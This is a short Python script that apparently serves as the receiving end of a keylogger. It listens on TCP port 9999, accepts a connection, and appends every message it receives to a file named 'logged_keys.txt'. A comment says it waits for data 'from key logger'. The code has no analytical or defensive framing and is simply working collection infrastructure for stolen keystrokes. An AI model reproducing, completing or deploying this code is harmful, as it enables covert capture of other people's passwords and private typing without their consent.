import socket 
from pynput.keyboard import Key
# create a socket object 
serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
# get local machine name 
host = socket.gethostname() 
port = 9999 
# bind socket to public host, and a port 
serversocket.bind((host, port)) 
# become a server socket 
serversocket.listen(1) 
keyInput = None

# establish a connection 
clientsocket, addr = serversocket.accept() 

message  = "asasasasas"

file_path = "logged_keys.txt"
file = None
try:
    file = open(file_path, 'x')
except FileExistsError:
    file = open(file_path, 'a')

while len(message) >= 10: 
    #wait to receive data from key logger
    message = clientsocket.recv(1024).decode()
    file.write(message + "\n")

# close the client connection 
clientsocket.close()
serversocket.close()